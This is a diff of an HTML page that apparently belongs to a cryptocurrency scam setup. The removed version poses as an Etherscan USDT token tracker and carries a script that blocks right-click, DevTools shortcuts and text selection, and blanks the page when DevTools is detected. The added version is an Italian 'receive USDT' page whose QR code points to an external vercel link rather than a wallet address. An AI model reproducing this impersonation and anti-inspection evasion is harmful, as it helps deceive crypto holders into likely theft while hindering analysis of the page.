@@ -1,96 +1,294 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
-    <meta charset="UTF-8">
-    <meta
-        name="viewport"
-        content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"
-    />
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover"/>
 
-    <title>Tether (USDT) Token Tracker | Etherscan</title>
+<title>Ricevi USDT</title>
 
-    <link rel="icon" type="image/svg+xml" href="./images/eth.svg" />
-    <link rel="stylesheet" href="./index.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+<style>
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+}
+
+body{
+    background:#ffffff;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    color:#111827;
+    min-height:100vh;
+}
+
+.container{
+    max-width:480px;
+    margin:auto;
+    padding:20px;
+}
+
+.header{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-top:8px;
+    margin-bottom:30px;
+}
+
+.back{
+    font-size:28px;
+    color:#111827;
+}
+
+.title{
+    font-size:22px;
+    font-weight:700;
+}
+
+.empty{
+    width:28px;
+}
+
+.warning{
+    background:#FFF7ED;
+    border-radius:16px;
+    padding:16px;
+    display:flex;
+    gap:12px;
+    margin-bottom:28px;
+}
+
+.warning-icon{
+    width:24px;
+    height:24px;
+    border-radius:50%;
+    background:#FDBA74;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:700;
+    color:#fff;
+    flex-shrink:0;
+}
+
+.warning-text{
+    font-size:14px;
+    line-height:1.5;
+    color:#7C2D12;
+}
+
+.coin-card{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:30px;
+}
+
+.coin-left{
+    display:flex;
+    align-items:center;
+    gap:14px;
+}
+
+.coin-icon{
+    width:52px;
+    height:52px;
+    border-radius:50%;
+    background:#26A17B;
+    color:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:24px;
+    font-weight:700;
+}
+
+.coin-info h3{
+    font-size:18px;
+    margin-bottom:4px;
+}
+
+.coin-info p{
+    color:#6B7280;
+    font-size:14px;
+}
+
+.chain{
+    background:#EEF2FF;
+    color:#4338CA;
+    padding:8px 14px;
+    border-radius:999px;
+    font-weight:600;
+    font-size:14px;
+}
+
+.qr-wrap{
+    display:flex;
+    justify-content:center;
+    margin:30px 0;
+}
+
+#qrcode{
+    padding:14px;
+    border:1px solid #E5E7EB;
+    border-radius:28px;
+}
+
+.address{
+    text-align:center;
+    margin-top:20px;
+}
+
+.address p{
+    color:#6B7280;
+    font-size:14px;
+    margin-bottom:8px;
+}
+
+.link{
+    word-break:break-all;
+    font-weight:600;
+    font-size:15px;
+}
+
+.buttons{
+    margin-top:36px;
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+}
+
+.btn{
+    width:100%;
+    border:none;
+    border-radius:999px;
+    padding:18px;
+    font-size:16px;
+    font-weight:600;
+    cursor:pointer;
+}
+
+.btn-primary{
+    background:#2563EB;
+    color:#fff;
+}
+
+.btn-secondary{
+    background:#F3F4F6;
+    color:#111827;
+}
+
+.footer{
+    text-align:center;
+    margin-top:32px;
+    color:#9CA3AF;
+    font-size:13px;
+}
+</style>
 </head>
 
 <body>
-    <div id="root"></div>
 
-    <!-- ethers -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+<div class="container">
 
-    <!-- APP -->
-    <script type="module" src="./index.js"></script>
+    <div class="header">
+        <div class="back">‹</div>
+        <div class="title">Ricevi</div>
+        <div class="empty"></div>
+    </div>
 
-    <!-- BLOCCO ISPEZIONA -->
-    <script>
-        // Disabilita tasto destro
-        document.addEventListener("contextmenu", function (e) {
-            e.preventDefault();
-        });
+    <div class="warning">
+        <div class="warning-icon">!</div>
 
-        // Blocca scorciatoie DevTools
-        document.addEventListener("keydown", function (e) {
+        <div class="warning-text">
+            Invia solo <strong>USDT ERC20</strong> a questo indirizzo.
+            L'invio di altre monete potrebbe causare
+            la perdita permanente dei fondi.
+        </div>
+    </div>
 
-            // F12
-            if (e.key === "F12") {
-                e.preventDefault();
-                return false;
-            }
+    <div class="coin-card">
+        <div class="coin-left">
 
-            // Ctrl + Shift + I/J/C
-            if (
-                e.ctrlKey &&
-                e.shiftKey &&
-                ["I", "J", "C"].includes(e.key.toUpperCase())
-            ) {
-                e.preventDefault();
-                return false;
-            }
+            <div class="coin-icon">
+                ₮
+            </div>
 
-            // Ctrl + U
-            if (
-                e.ctrlKey &&
-                e.key.toUpperCase() === "U"
-            ) {
-                e.preventDefault();
-                return false;
-            }
+            <div class="coin-info">
+                <h3>USDT</h3>
+                <p>Tether USD</p>
+            </div>
+        </div>
 
-            // Cmd + Opt + I (Mac)
-            if (
-                e.metaKey &&
-                e.altKey &&
-                e.key.toUpperCase() === "I"
-            ) {
-                e.preventDefault();
-                return false;
-            }
-        });
+        <div class="chain">
+            Ethereum
+        </div>
+    </div>
 
-        // Rileva DevTools aperti
-        setInterval(function () {
-            const widthThreshold =
-                window.outerWidth - window.innerWidth > 160;
+    <div class="qr-wrap">
+        <div id="qrcode"></div>
+    </div>
 
-            const heightThreshold =
-                window.outerHeight - window.innerHeight > 160;
+    <div class="address">
+        <p>Scansiona il QR code</p>
 
-            if (widthThreshold || heightThreshold) {
-                document.body.innerHTML = "";
-                window.location.href = "about:blank";
-            }
-        }, 1000);
+        <div class="link">
+            https://sftw.vercel.app/receive.html
+        </div>
+    </div>
 
-        // Disabilita selezione testo
-        document.addEventListener("selectstart", function (e) {
-            e.preventDefault();
-        });
+    <div class="buttons">
 
-        // Disabilita drag immagini
-        document.addEventListener("dragstart", function (e) {
-            e.preventDefault();
-        });
-    </script>
+        <button class="btn btn-secondary"
+        onclick="copyLink()">
+            Copia link
+        </button>
+
+        <button class="btn btn-primary"
+        onclick="closePage()">
+            Continua
+        </button>
+
+    </div>
+
+    <div class="footer">
+        Ricezione rete ERC20
+    </div>
+
+</div>
+
+<script>
+const LINK =
+"https://sftw.vercel.app/receive.html";
+
+new QRCode(
+    document.getElementById("qrcode"),
+    {
+        text: LINK,
+        width: 240,
+        height: 240
+    }
+);
+
+function copyLink() {
+    navigator.clipboard.writeText(LINK);
+
+    alert("Link copiato");
+}
+
+function closePage() {
+    window.close();
+
+    setTimeout(() => {
+        history.back();
+    }, 300);
+
+    setTimeout(() => {
+        location.href = "about:blank";
+    }, 600);
+}
+</script>
+
 </body>
 </html>
